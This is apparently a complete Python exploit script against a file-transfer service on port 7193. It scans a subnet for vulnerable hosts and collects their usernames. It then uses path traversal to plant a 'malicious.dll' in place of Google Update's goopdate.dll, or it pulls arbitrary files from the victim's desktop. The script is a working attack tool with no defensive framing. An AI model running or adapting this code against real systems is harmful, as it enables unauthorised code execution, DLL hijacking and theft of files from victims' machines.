import os
from urllib3.exceptions import ConnectTimeoutError
from win32com.client import *
import requests
import json
 
localPayloadPath = r"c:\temp\malicious.dll"
remotePayloadPath="../Program Files (x86)/Google/Update/goopdate.dll"
remoteDownloadPath = r'C:\Users\User\Desktop\obligationservlet.pdf'
Range = "192.168.89"
UpOrDown="Upload"
IP = ""
UserName = ""
 
def get_version_number(file_path):
    information_parser = Dispatch("Scripting.FileSystemObject")
    version = information_parser.GetFileVersion(file_path)
    return version
 
 
def getTaskList(IP, taskid=""):
    print("Getting task list...")
    url = f'http://{IP}:7193/index.php?action=gettasklist&userid=*'
    res = requests.get(url)
    tasks = json.loads(res.content)
    tasks = json.loads(tasks['content'])
    for task in tasks['tasks']:
        if taskid == task['taskid']:
            print(f"Task ID found: {taskid}")
 
 
def CreateUploadTask(IP):
    SetSavePath(IP)
    url = f'http://{IP}:7193/index.php?action=createtask'
    task = {
        'method': 'get',
        'version': '1',
        'userid': '*',
        'taskstate': '0',
    }
    res = requests.post(url, json=task)
    task = json.loads(res.content)
    task = json.loads(task['content'])
    taskid = task['taskid']
    print(f"[*] TaskID: {taskid}")
    return taskid
 
 
def CreateUploadDetailNode(IP, taskid, remotePath, size='100'):
    url = f'http://{IP}:7193/index.php?action=settaskdetailbyindex&userid=*&taskid={taskid}&index=0'
    file_info = {
        'size': size,
        'savefilename': remotePath,
        'name': remotePath,
        'fullpath': r'c:\windows\system32\calc.exe',
        'md5': 'md5md5md5md5md5',
        'filetype': '3',
    }
    res = requests.post(url, json=file_info)
    js = json.loads(res.content)
    print(f"[V] Create Detail returned: {js['code']}")
 
 
def readFile(Path):
    file = open(Path, "rb")
    byte = file.read(1)
    next = "Start"
    while next != b'':
        byte = byte + file.read(1023)
        next = file.read(1)
        if next != b'':
            byte = byte + next
    file.close()
    return byte
 
 
def CallUpload(IP, taskid, localPayloadPath):
    url = f'http://{IP}:7193/index.php?action=newuploadfile&userid=*&taskid={taskid}&index=0'
    send_data = readFile(localPayloadPath)
    try:
        res = requests.post(url, data=send_data)
        js = json.loads(res.content)
        if js['code'] == 200:
            print("[V] Success payload uploaded!")
        else:
            print(f"CreateRemoteFile: {res.content}")
    except:
        print("[*] Reusing the task...")
        res = requests.post(url, data=send_data)
        js = json.loads(res.content)
        if js['code'] == 200 or "false" in js['error']:
            print("[V] Success payload uploaded!")
        else:
            print(f"[X] CreateRemoteFile Failed: {res.content}")
 
 
def SetSavePath(IP):
    url = f'http://{IP}:7193/index.php?action=setiotconfig'
    config = {
        'tasksavepath': 'C:\\Program '
    }
    requests.post(url, json=config)
 
def ExploitUpload(IP,payloadPath,rPath,taskid =None):
    if not taskid:
        taskid = CreateUploadTask(IP)
        size = os.path.getsize(payloadPath)
    CreateUploadDetailNode(IP, taskid, remotePath=rPath, size=str(size))
    CallUpload(IP, taskid, payloadPath)
 
 
def CreateDownloadTask(IP, Path) -> str:
    url = f'http://{IP}:7193/index.php?action=createtask'
    task = {
        'method': 'get',
        'version': '1',
        'userid': '*',
        'taskstate': '0',
        'filepath': Path
    }
    res = requests.post(url, json=task)
    task = json.loads(res.content)
    task = json.loads(task['content'])
    taskid = task['taskid']
    print(f"TaskID: {taskid}")
    return taskid
 
 
def ExploitDownload(IP, DownloadPath, ID=None):
    if ID:
        url = f'http://{IP}:7193/index.php?action=downloadfile&userid=*&taskid={ID}'
    else:
        taskid = CreateDownloadTask(IP, DownloadPath)
        url = f'http://{IP}:7193/index.php?action=downloadfile&userid=*&taskid={taskid}'
    res = requests.get(url)
    return res
 
def ScanIP(startRange):
    print("[*] Searching for vulnerable IPs", end='')
    Current = 142
    IP = f"{startRange}.{Current}"
    VulnerableIP: str = ""
    UserName: str = ""
    while Current < 252:
        print(".", end='')
        url = f'http://{IP}:7193/index.php?action=getpcname&userid=*'
        try:
            res = requests.get(url, timeout=1)
            js = json.loads(res.content)
            js2 = json.loads(js['content'])
            UserName = js2['name']
            VulnerableIP=IP
            print(f"\n[V] Found a Vulnerable IP: {VulnerableIP}")
            print(f"[!] Vulnerable PC username: {UserName}")
            return VulnerableIP,UserName
        except Exception as e:
            pass
        except ConnectTimeoutError:
            pass
        IP = f"{startRange}.{Current}"
        Current = Current + 1
    return None,None
 
 
if __name__ == '__main__':
    IP,UserName = ScanIP(Range)
    if IP is None or UserName is None:
        print("[X] No vulnerable IP found")
        exit()
    print("[*] Starting Exploit...")
    if UpOrDown == "Upload":
        print(f"[*]Local Payload Path: {localPayloadPath}")
        print(f"[*]Remote Upload Path: {remotePayloadPath}")
        ExploitUpload(IP,localPayloadPath,remotePayloadPath)
    elif UpOrDown == "Download":
        print(f"[*] Downloading the file: {remoteDownloadPath}")
        res = ExploitDownload(IP, remoteDownloadPath)
        file = open("out.pdf", "wb+")
        file.write(res.content)
        file.close()